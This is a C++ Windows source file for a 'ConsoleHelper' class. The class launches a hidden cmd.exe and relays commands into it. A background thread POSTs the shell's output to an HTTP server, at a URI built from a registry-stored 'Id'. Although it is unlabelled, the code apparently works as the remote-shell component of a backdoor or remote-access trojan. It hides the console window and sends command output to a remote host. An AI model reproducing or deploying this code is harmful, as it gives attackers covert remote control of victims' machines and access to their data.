#include "stdafx.h"
#include "ConsoleHelper.h"
#include "HttpClient.h"
#include "RegistryHelper.h"



DWORD WINAPI readFromPipe(LPVOID helper)
{
	ConsoleHelper *self = (ConsoleHelper *)helper;
	char result[BUFSIZE];
	DWORD actual = 0;

	for (;;)
	{
		auto read = ReadFile((HANDLE)self->hReadPipe1, result, BUFSIZE-1, &actual, NULL);
		if (read == FALSE)
			break;

		if (actual > 0)
		{
			result[actual] = '\0';
			auto toSkip = min(strlen(result), self->skipChars);
			auto resultWithSkip = result + toSkip;
			self->skipChars -= toSkip;
			if (strlen(resultWithSkip) == 0)
				continue;

			auto buff = string_t(BUFSIZE, L'\0');
			auto size = MultiByteToWideChar(CP_UTF8, 0, resultWithSkip, actual, (LPWSTR)&buff.c_str()[0], BUFSIZE -1);
			buff.resize(size);
			self->writeToWeb(buff);
		}

		Sleep(10);
	}
	

	//if (!ReadFromPipe(hReadPipe1, buff, BUFSIZE - 1))
	//	return;
	////--- part 2 ---
	//


	//unsigned long lpBytesRead, readed;
	//char *p;

	//lpBytesRead = 0;
	//while (PeekNamedPipe(pipe, buf, max_len - 1, &readed, &lpBytesRead, 0));

	//if (lpBytesRead > 0)
	//{
	//	lpBytesRead = readed > max_len ? max_len : readed;
	//	p = buf;
	//	while (lpBytesRead > 0)
	//	{
	//		if (!ReadFile(pipe, p, lpBytesRead, &readed, NULL)) return 0;
	//		if (readed == 0) break;

	//		lpBytesRead -= readed;
	//		p += readed;
	//	}
	//	*p = 0;
	//}
	//else
	return 0;

	//return 1;
}




void ConsoleHelper::writeToWeb(string_t data)
{
	http_request request(methods::POST);

	auto id = RegistryHelper::GetValue(string_t(L"Id"));
	request.set_request_uri(id);
	auto uri = request.request_uri();

	json::value obj;
	obj[L"value"] = json::value(data);
		
	request.set_body(obj);

	auto commandRes = client->request(request).then([](http_response response) -> pplx::task<json::value>
	{
		if (response.status_code() == status_codes::OK)
		{
			return response.extract_json();
		}

		// Handle error cases, for now return empty json value... 
		return pplx::task_from_result(json::value());
	}).get();
}



ConsoleHelper::ConsoleHelper(http_client *client): client(client)
{
	//this->client = client;
}

ConsoleHelper::~ConsoleHelper()
{
}



void ConsoleHelper::Start()
{	
	PROCESS_INFORMATION pi;
	int ret;
	SECURITY_ATTRIBUTES sa;

	sa.nLength = sizeof(sa);
	sa.lpSecurityDescriptor = 0;
	sa.bInheritHandle = TRUE;	

	ret = CreatePipe(&hReadPipe1, &hWritePipe1, &sa, 0);
	ret = CreatePipe(&hReadPipe2, &hWritePipe2, &sa, 0);

	STARTUPINFO si;
	ZeroMemory(&si, sizeof(si));

	GetStartupInfo(&si);

	si.cb = sizeof(si);
	si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
	si.wShowWindow = SW_HIDE;
	si.hStdInput = hReadPipe2;
	si.hStdOutput = si.hStdError = hWritePipe1;
	
	ZeroMemory(&pi, sizeof(pi));

	wchar_t executable[256];
	wcscpy_s(executable, 256, L"cmd /K chcp 65001");	
	
	ret = CreateProcess(NULL, executable, NULL, NULL, 1, 0, NULL, NULL, &si, &pi);
	
	hProcess = pi.hProcess;
	hProcessThread = pi.hThread;
	
	DWORD iReadThread;

	hReadThread = CreateThread(
		NULL,                   // default security attributes
		0,                      // use default stack size  
		readFromPipe,       // thread function name
		(LPDWORD)this,          // argument to thread function 
		0,                      // use default creation flags 
		&iReadThread);   // returns the thread identifier 
}

void ConsoleHelper::Exit()
{
	DWORD lBytesWrite;

	WriteFile(hWritePipe2, "exit\r\n", strlen("exit\r\n"), &lBytesWrite, NULL);	
	WaitForSingleObject(hProcess, 3000);
	TerminateProcess(hProcess, 0);
	CloseHandle(hProcess);
	CloseHandle(hProcessThread);	
	
	TerminateThread(hReadThread, 0);
	CloseHandle(hReadThread);

	CloseHandle(hReadPipe1);
	CloseHandle(hWritePipe1);
	CloseHandle(hReadPipe2);
	CloseHandle(hWritePipe2);
}

void ConsoleHelper::Enter(string_t command)
{
	unsigned long lBytesWrite;
	auto enter = command + L"\r\n";
//	size_t converted;
//	wcstombs_s(&converted, buff, BUFSIZE, enter.c_str(), BUFSIZE);
	size_t sizeRequired = WideCharToMultiByte(CP_UTF8, 0, enter.c_str(), -1, NULL, 0, NULL, NULL);

	auto buff = new char[sizeRequired];
	WideCharToMultiByte(CP_UTF8, 0, enter.c_str(),  enter.size(), buff, sizeRequired, NULL, NULL);
	buff[sizeRequired -1] = '\0';
	skipChars += sizeRequired - 1;
	WriteFile(hWritePipe2, buff, sizeRequired-1, &lBytesWrite, NULL);
}
